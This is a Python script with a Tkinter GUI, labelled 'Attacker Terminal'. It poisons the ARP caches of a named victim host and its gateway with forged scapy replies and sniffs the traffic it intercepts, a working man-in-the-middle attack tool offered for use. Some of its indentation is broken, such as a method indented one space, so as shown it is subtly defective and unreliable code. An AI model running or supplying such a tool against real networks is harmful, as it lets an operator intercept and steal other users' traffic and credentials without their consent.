#!/usr/bin/env python3
import scapy.all as scapy
import time
import sys
import threading
import tkinter as tk
from tkinter import ttk, messagebox
from scapy.all import AsyncSniffer

def get_mac(ip):
    """
    Sends an ARP request to resolve the MAC address for the specified IP.
    """
    request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    final_packet = broadcast / request
    answered_list = scapy.srp(final_packet, timeout=2, verbose=False)[0]
    if answered_list:
        return answered_list[0][1].hwsrc
    else:
        messagebox.showerror("Error", f"Could not resolve MAC address for {ip}.")
        raise Exception(f"Could not resolve MAC address for {ip}.")

def spoof(target_ip, spoof_ip):
    """
    Sends a forged ARP reply to the target, telling it that spoof_ip is at our MAC.
    """
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(dest_ip, src_ip):
    """
    Sends genuine ARP replies to restore the correct mapping between dest_ip and src_ip.
    """
    dest_mac = get_mac(dest_ip)
    src_mac = get_mac(src_ip)
    packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac,
                         psrc=src_ip, hwsrc=src_mac)
    scapy.send(packet, count=5, verbose=False)

class ARPSpoofGUI:
    def __init__(self, master):
        self.master = master
        master.title("ARP Spoofing Tool - Attacker Terminal")
        master.geometry("600x600")
        master.configure(bg="#1e1e1e")
        # Set the desktop icon (ensure "icon.png" exists)
        try:
            icon = tk.PhotoImage(file="icon.png")
            master.iconphoto(True, icon)
        except Exception as e:
            print("Icon not found:", e)
        
        # Variables
        self.target_ip_var = tk.StringVar()
        self.gateway_ip_var = tk.StringVar()
        self.packets_sent = 0
        self.spoofing_active = False

        # MITM Simulation Variables
        self.mitm_sniffer = None

        # Title Label
        self.title_label = tk.Label(master, text="ARP Spoofing Tool", font=("Segoe UI", 20, "bold"), fg="#ff4d4d", bg="#1e1e1e")
        self.title_label.pack(pady=10)
        
        # Input Frame
        self.input_frame = tk.Frame(master, bg="#1e1e1e")
        self.input_frame.pack(pady=10)
        
        tk.Label(self.input_frame, text="Target IP (Victim):", font=("Segoe UI", 12), fg="white", bg="#1e1e1e").grid(row=0, column=0, sticky="e", padx=5, pady=5)
        self.target_ip_entry = tk.Entry(self.input_frame, textvariable=self.target_ip_var, font=("Segoe UI", 12), width=20)
        self.target_ip_entry.grid(row=0, column=1, padx=5, pady=5)
        
        tk.Label(self.input_frame, text="Gateway IP:", font=("Segoe UI", 12), fg="white", bg="#1e1e1e").grid(row=1, column=0, sticky="e", padx=5, pady=5)
        self.gateway_ip_entry = tk.Entry(self.input_frame, textvariable=self.gateway_ip_var, font=("Segoe UI", 12), width=20)
        self.gateway_ip_entry.grid(row=1, column=1, padx=5, pady=5)
        
        # Buttons Frame for Spoofing and Control
        self.button_frame = tk.Frame(master, bg="#1e1e1e")
        self.button_frame.pack(pady=10)
        
        self.start_button = tk.Button(self.button_frame, text="Start Spoofing", font=("Segoe UI", 12, "bold"), fg="white", bg="#4CAF50", command=self.start_spoofing)
        self.start_button.grid(row=0, column=0, padx=10)
        
        self.stop_button = tk.Button(self.button_frame, text="Stop & Restore", font=("Segoe UI", 12, "bold"), fg="white", bg="#f44336", command=self.stop_spoofing, state="disabled")
        self.stop_button.grid(row=0, column=1, padx=10)
        
        # Add Exit Button
        self.exit_button = tk.Button(self.button_frame, text="Exit", font=("Segoe UI", 12, "bold"), fg="white", bg="#555555", command=self.exit_application)
        self.exit_button.grid(row=0, column=2, padx=10)
        
        # Status Label and Packet Counter
        self.status_label = tk.Label(master, text="Status: Idle", font=("Segoe UI", 12), fg="white", bg="#1e1e1e")
        self.status_label.pack(pady=5)
        self.packet_label = tk.Label(master, text="Packets sent: 0", font=("Segoe UI", 12), fg="white", bg="#1e1e1e")
        self.packet_label.pack(pady=5)
        
        # Progress Bar for creative flair
        self.progress = ttk.Progressbar(master, orient="horizontal", length=300, mode="indeterminate")
        self.progress.pack(pady=10)
       # ----------------- MITM Simulation Section -----------------
        mitm_frame = tk.Frame(master, bg="#1e1e1e")
        mitm_frame.pack(pady=10, fill="both", expand=True)
        
        self.mitm_label = tk.Label(mitm_frame, text="MITM Simulation (Packet Sniffing)", font=("Segoe UI", 14, "bold"), fg="#ffcc00", bg="#1e1e1e")
        self.mitm_label.pack(pady=5)
        
        # Buttons for controlling MITM simulation
        mitm_button_frame = tk.Frame(mitm_frame, bg="#1e1e1e")
        mitm_button_frame.pack(pady=5)
        self.start_mitm_button = tk.Button(mitm_button_frame, text="Start MITM Simulation", font=("Segoe UI", 12), fg="white", bg="#4CAF50", command=self.start_mitm)
        self.start_mitm_button.grid(row=0, column=0, padx=10)
        self.stop_mitm_button = tk.Button(mitm_button_frame, text="Stop MITM Simulation", font=("Segoe UI", 12), fg="white", bg="#f44336", command=self.stop_mitm, state="disabled")
        self.stop_mitm_button.grid(row=0, column=1, padx=10)
        
        # Scrolled Text widget for displaying sniffed packet summaries
        self.mitm_text = tk.Text(mitm_frame, height=10, bg="#333333", fg="white", font=("Segoe UI", 10))
        self.mitm_text.pack(pady=5, fill="both", expand=True)
        self.mitm_text.insert(tk.END, "MITM simulation log will appear here...\n")
        
    def start_spoofing(self):
        target_ip = self.target_ip_var.get().strip()
        gateway_ip = self.gateway_ip_var.get().strip()
        if not target_ip or not gateway_ip:
            messagebox.showerror("Input Error", "Please enter both target and gateway IP addresses.")
            return
        
        # Disable inputs and start button; enable stop button
        self.target_ip_entry.config(state="disabled")
        self.gateway_ip_entry.config(state="disabled")
        self.start_button.config(state="disabled")
        self.stop_button.config(state="normal")
        
        self.status_label.config(text="Status: Spoofing in progress...", fg="#ffcc00")
        self.packets_sent = 0
        self.update_packet_label()
        self.spoofing_active = True
        self.progress.start(10)
        
        # Start the spoofing loop in a separate thread
        self.spoof_thread = threading.Thread(target=self.spoof_loop, args=(target_ip, gateway_ip), daemon=True)
        self.spoof_thread.start()
        
    def spoof_loop(self, target_ip, gateway_ip):
        try:
            while self.spoofing_active:
                # Tell the target that the gateway is at our MAC
                spoof(target_ip, gateway_ip)
                # Tell the gateway that the target is at our MAC (for a MITM attack)
                spoof(gateway_ip, target_ip)
                self.packets_sent += 2
                self.master.after(0, self.update_packet_label)
                time.sleep(2)
        except Exception as e:
            self.master.after(0, lambda: messagebox.showerror("Error", str(e)))
 def update_packet_label(self):
        self.packet_label.config(text=f"Packets sent: {self.packets_sent}")
    
    def stop_spoofing(self):
        self.spoofing_active = False
        self.progress.stop()
        self.status_label.config(text="Status: Restoring ARP tables...", fg="#ff9900")
        self.stop_button.config(state="disabled")
        target_ip = self.target_ip_var.get().strip()
        gateway_ip = self.gateway_ip_var.get().strip()
        try:
            restore(target_ip, gateway_ip)
            restore(gateway_ip, target_ip)
            self.status_label.config(text="Status: ARP tables restored. Spoofing stopped.", fg="#66ff66")
        except Exception as e:
            self.status_label.config(text="Status: Error restoring ARP tables.", fg="#ff3333")
            messagebox.showerror("Restore Error", str(e))
        # Re-enable inputs and start button
        self.target_ip_entry.config(state="normal")
        self.gateway_ip_entry.config(state="normal")
        self.start_button.config(state="normal")
    
    def start_mitm(self):
        target_ip = self.target_ip_var.get().strip()
        gateway_ip = self.gateway_ip_var.get().strip()
        if not target_ip or not gateway_ip:
            messagebox.showerror("Input Error", "Please enter both target and gateway IP addresses.")
            return
        
        # Build a filter to capture traffic for target and gateway
        filter_str = f"host {target_ip} or host {gateway_ip}"
        try:
            self.mitm_sniffer = AsyncSniffer(filter=filter_str, prn=self.mitm_packet_callback, store=False)
            self.mitm_sniffer.start()
            self.start_mitm_button.config(state="disabled")
            self.stop_mitm_button.config(state="normal")
            self.mitm_text.insert(tk.END, "MITM Simulation started...\n")
        except Exception as e:
            messagebox.showerror("MITM Error", str(e))
    
    def stop_mitm(self):
        if self.mitm_sniffer:
            self.mitm_sniffer.stop()
            self.mitm_sniffer = None
        self.start_mitm_button.config(state="normal")
        self.stop_mitm_button.config(state="disabled")
        self.mitm_text.insert(tk.END, "MITM Simulation stopped.\n")
    
    def mitm_packet_callback(self, packet):
        summary = packet.summary()
        # Insert the packet summary into the text widget
        self.master.after(0, lambda: self.mitm_text.insert(tk.END, summary + "\n"))
        self.master.after(0, lambda: self.mitm_text.see(tk.END))
 
    def exit_application(self):
        # Stop spoofing and MITM simulation before exiting
        self.spoofing_active = False
        if self.mitm_sniffer:
            self.mitm_sniffer.stop()
        self.master.destroy()

def main():
    root = tk.Tk()
    # Set desktop icon for spoofer GUI
    try:
        icon = tk.PhotoImage(file="icon.png")
        root.iconphoto(True, icon)
    except Exception as e:
        print("Icon not found:", e)
    app = ARPSpoofGUI(root)
    root.mainloop()

if __name__ == "__main__":
    main()
